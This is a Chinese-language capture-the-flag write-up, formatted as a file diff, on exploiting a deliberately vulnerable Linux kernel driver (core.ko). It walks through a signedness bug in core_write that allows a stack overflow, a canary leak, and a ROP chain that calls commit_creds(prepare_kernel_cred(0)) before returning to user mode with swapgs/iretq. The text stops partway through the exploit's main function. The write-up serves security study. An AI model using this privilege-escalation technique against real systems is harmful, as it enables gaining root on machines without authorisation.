@@ -1,0 +1,180 @@
+## 前言：
+接着上篇说的，这篇主要讨论一下ROP构造以及Double Fetch的利用。上一篇中Bypass smep的一部分构造没有明白的，在这篇中会得到详细的解答。
+## ROP：
+题目（见附件）照常给了三个文件，照样常规流程来，先把硬盘镜像给解压了，再看看start.sh文件启动内核的脚本：
+    qemu-system-x86_64 \
+    -m 128M \
+    -kernel ./bzImage \
+    -initrd  ./core.cpio \
+    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
+    -s  \
+    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+    -nographic  \
+开了kaslr保护。相当于用户态pwn的aslr地址随机化。
+再看看镜像文件里的init文件：
+    #!/bin/sh
+    mount -t proc proc /proc
+    mount -t sysfs sysfs /sys
+    mount -t devtmpfs none /dev
+    /sbin/mdev -s
+    mkdir -p /dev/pts
+    mount -vt devpts -o gid=4,mode=620 none /dev/pts
+    chmod 666 /dev/ptmx
+    cat /proc/kallsyms > /tmp/kallsyms
+    echo 1 > /proc/sys/kernel/kptr_restrict
+    echo 1 > /proc/sys/kernel/dmesg_restrict
+    ifconfig eth0 up
+    udhcpc -i eth0
+    ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+    route add default gw 10.0.2.2 
+    insmod /core.ko
+    poweroff -d 120 -f &
+    setsid /bin/cttyhack setuidgid 2000 /bin/sh
+    echo 'sh end!\n'
+    umount /proc
+    umount /sys
+    poweroff -d 0  -f
+看到了这一句：
+    cat /proc/kallsyms > /tmp/kallsyms
+可以直接在tmp目录下拿到`prepare_kernel_cred`和`commit_creds`的地址。不需要root权限。
+还有这一句：
+    poweroff -d 120 -f &
+定时关机的命令，为了方便调试，把这一句给删掉。
+镜像文件里面还有一个sh文件：
+    find . -print0 \
+    | cpio --null -ov --format=newc \
+    | gzip -9 > $1
+看来是打包镜像的命令了，所以我们可以利用它来重新打包我们的镜像。
+继续看驱动文件，来找找驱动程序的利用点。
+### Checksec：
+    ➜  give_to_player checksec core.ko 
+    [*] '/media/psf/Downloads/give_to_player/core.ko'
+        Arch:     amd64-64-little
+        RELRO:    No RELRO
+        Stack:    Canary found
+        NX:       NX enabled
+        PIE:      No PIE (0x0)
+### core_ioctl：
+    __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
+    {
+      __int64 v3; // rbx
+      v3 = a3;
+      switch ( a2 )
+      {
+        case 1719109787:
+          core_read(a3);
+          break;
+        case 1719109788:
+          printk(&unk_2CD);
+          off = v3;
+          break;
+        case 1719109786:
+          printk(&unk_2B3);
+          core_copy_func(v3);
+          break;
+      }
+      return 0LL;
+    }
+很明显的选择结构，为1719109788时设置off的值。
+### core_write：
+    signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
+    {
+      unsigned __int64 v3; // rbx
+      v3 = a3;
+      printk(&unk_215);
+      if ( v3  63 )
+      {
+        printk(&unk_2A1);
+        result = 0xFFFFFFFFLL;
+      }
+      else
+      {
+        result = 0LL;
+        qmemcpy(&v2, &name, (unsigned __int16)a1);  // overflow ------> rop
+      }
+      return result;
+    }
+这里的漏洞点不太容易注意到，这里的函数参数a1即输入是八字节的有符号整数，而在`qmemcpy`函数中则是双字节的无符号整数，所以当设置`a1=0xffffffffffff0200`即可绕过`a1>63`的检查并在`qmemcpy`中得到a1为0x0200的值。并且v2为栈中的值，超长复制即可溢出。从name字段复制，name字段的内容是我们可控的，所以利用点就很容易可以得到。
+#### 利用流程：
+  1. 设置`off`的值
+  2. 调用core_read泄漏出canary的值
+  3. 调用core_write往`name`字段构造ROP
+  4. 调用core_copy_func发生溢出劫持控制流
+先随意设置一个off的值再去调试看看gdb中canary的位置，我设置了off为0x40：
+再看看栈：
+经后面调试判断比较canary时可以得知上图箭头所指处就是canary的值。所以我们就可以设置off为0x40泄漏得知canary的值。
+这下后面的rop构造就和我们以往做pwn时一样构造就可以了。kernel
+pwn是为了提权，所以我们需要调用`commit_creds(prepare_kernel_cred(0))`就可提权。况且commit_creds和prepare_kernel_cred的函数地址我们从上面了解到可以从tmp目录下直接得到。我们需要这样构造rop：
+    pop rdi;ret
+    0
+    prepare_kernel_cred
+    mov rdi,rax;ret
+    commit_creds
+但是从vmlinux中提取出来的rop没有`mov rdi,rax;ret`，所以我们仍可以换一种方法：
+    pop rdx;ret
+    commit_creds
+    mov rdi,rax;jmp rdx
+    或
+    pop rdx;ret
+    pop rcx;ret
+    mov rdi,rax;call rdx
+    commit_creds
+这里需要注意的一个点就是程序是开了kaslr的。所以这些从vmlinux中找的rop都不是真实地址，需要加上offset偏移才行，而这里的偏移可以用vmlinux中查得的`prepare_kernel_cred`地址和qemu中的`prepare_kernel_cred`相减即可得到。
+    直接查看得地址
+    pwndbg> p prepare_kernel_cred 
+    $1 = {} 0xffffffff8109cce0 
+所以在vmlinux中查的rop都需要加上offset才为真实地址。
+所构造的rop如下：
+    unsigned long int rop_content[] = {
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        0x9090909090909090,
+        canary_,
+        0x9090909090909090,
+        0xffffffff81000b2f+offset_size, //pop rdi;ret
+        0x0,
+        pkd_addr,
+        0xffffffff810a0f49+offset_size, //pop rdx;ret
+        cc_addr,
+        0xffffffff8106a6d2+offset_size, //mov rdi,rax;jmp rdx
+        0xffffffff81a012da+offset_size, //swapgs;popfq;ret
+        0,
+        0xffffffff81050ac2+offset_size, //iretq;
+        (unsigned long)getshell,
+        user_cs,
+        user_flag,
+        user_rsp,
+        user_ss
+        };
+下图中的`swapgs;popfq;ret`阶段是提权的必要操作，毕竟我们已经利用上面的函数提权完了，接下来要做的事情就是从内核态转回用户态了，所以需要恢复几个必要寄存器的值。
+这里还需要注意的一个点就是调用`core_copy_func`函数时，传参不能直接传`-1`，经调试发现直接传`-1`会导致最终得到4字节的值，最终无法绕过上面所说的`>63`。
+### EXP：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    unsigned long int user_cs,user_ss,user_rsp,user_flag;
+    void save_state(){
+        __asm__("mov user_cs,cs;"
+                "mov user_ss,ss;"
+                "mov user_rsp,rsp;"
+                "pushf;"
+                "pop user_flag;"
+               );
+        puts("[*]Save the state!");
+    }
+    void getshell(){
+        system("/bin/sh");
+    }
+    int main(){
+        save_state();
+        unsigned long int *tcach = (unsigned long int *)malloc(0x40);
